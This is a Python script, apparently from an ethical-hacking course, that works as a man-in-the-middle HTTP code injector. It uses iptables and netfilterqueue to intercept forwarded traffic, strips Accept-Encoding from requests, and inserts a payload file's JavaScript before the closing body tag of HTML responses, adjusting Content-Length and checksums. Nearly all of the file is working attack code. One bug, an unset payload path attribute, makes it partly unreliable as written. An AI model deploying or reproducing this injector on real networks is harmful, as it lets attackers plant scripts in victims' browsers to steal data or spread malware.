import netfilterqueue
import scapy.all as scapy
import re
import subprocess

class CodeInjector:
    def __init__(self, testing:bool = True):
        self.queue=netfilterqueue.NetfilterQueue()
        self.queue.bind(0,self.process_packet)
        if testing :
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num","0"])
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num","0"])
        else :
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num","0"])

    def run(self, payload:str =  "../4_payloads/test.txt"):
        with open(self.payload_path, "r") as f:
            self.new_code = f.read()
        self.queue.run()

    def set_load(self, packet,load):
        packet[scapy.Raw].load=load
        if "alert('test')" in str(packet[scapy.Raw].load):
            print(packet[scapy.Raw].load)
            print("JavaScript Injected Successfully")
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet):

        scapy_packet=scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw)  and scapy_packet.haslayer(scapy.TCP):
            try: 
                load=scapy_packet[scapy.Raw].load.decode()
            except UnicodeDecodeError:
                return 0

            

            if scapy_packet[scapy.TCP].dport == 80:
                
                load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
                
            elif scapy_packet[scapy.TCP].sport == 80:
                load=load.replace("</body>",self.new_code+"</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)

                if content_length_search and "text/html" in load:
                    content_length=content_length_search.group(1)
                    new_content_length=int(content_length)+len(self.new_code)
                    load = load.replace(content_length,str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet=self.set_load(scapy_packet,load)
                packet.set_payload(bytes(new_packet))
                print("load modified")

        packet.accept()


if __name__=="__main__":
    ci = CodeInjector()
    ci.run()


    